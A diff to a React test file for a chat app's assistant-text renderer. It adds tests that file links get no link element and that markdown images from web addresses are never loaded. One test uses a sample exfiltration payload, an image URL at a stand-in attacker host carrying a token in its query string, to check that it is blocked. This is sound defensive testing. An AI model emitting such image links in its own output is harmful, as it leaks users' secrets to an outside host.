@@ -1,5 +1,6 @@
+import { ok } from "@conducted/shared";
 import { cleanup, fireEvent, render, screen } from "@testing-library/react";
-import { afterEach, describe, expect, it, vi } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 
 const state = vi.hoisted(() => ({
 	markdown: "default",
@@ -14,11 +15,14 @@ vi.mock("../../core/hooks.ts", () => ({
 
 const { AssistantText } = await import("./AssistantText.tsx");
 
+beforeEach(() => {
+	state.openUrl.mockReset().mockResolvedValue(ok(undefined));
+});
+
 afterEach(() => {
 	cleanup();
 	state.markdown = "default";
 	state.strip = false;
-	state.openUrl.mockReset();
 });
 
 describe("CHAT-06 assistant text", () => {
@@ -73,11 +77,18 @@ describe("CHAT-06 assistant text", () => {
 		expect(screen.getByRole("img", { name: "A chart" }).getAttribute("src")).toBe("/tmp/chart.png");
 	});
 
-	it("keeps a non-web link from navigating the app window", () => {
+	it("gives a non-web link no link element, so nothing can navigate the app window", () => {
 		render(<AssistantText text={"[Open the file](file:///tmp/notes.txt)"} />);
-		const link = screen.getByRole("link", { name: "Open the file" });
-		expect(fireEvent.click(link)).toBe(false);
+		expect(screen.queryByRole("link")).toBeNull();
+		fireEvent.click(screen.getByText("Open the file"));
 		expect(state.openUrl).not.toHaveBeenCalled();
+	});
+
+	it("never loads an image from a web address, because the address could carry data out", () => {
+		render(<AssistantText text={"![secret](https://evil.test/p.png?q=token)"} />);
+		expect(screen.queryByRole("img")).toBeNull();
+		fireEvent.click(screen.getByRole("link", { name: "secret" }));
+		expect(state.openUrl).toHaveBeenCalledWith("https://evil.test/p.png?q=token");
 	});
 
 	it("keys equal list items and table cells by position", () => {
